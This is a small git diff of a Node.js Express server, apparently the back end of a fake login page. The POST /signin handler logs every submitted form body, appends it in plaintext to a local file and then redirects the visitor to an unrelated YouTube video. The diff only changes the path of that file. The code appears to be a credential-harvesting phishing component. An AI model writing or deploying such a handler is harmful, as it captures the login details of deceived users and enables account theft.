@@ -25,7 +25,7 @@ app.get('/login', (req,res) => {
 
 app.post('/signin', (req,res) => {
     console.log('Data',req.body);
-    fs.writeFile('./files/file',JSON.stringify(req.body),{flag: 'a'},function(){
+    fs.writeFile(__dirname + '/files/file',JSON.stringify(req.body),{flag: 'a'},function(){
     }
     )
     res.redirect('https://www.youtube.com/watch?v=v8p7mS2NAHg')
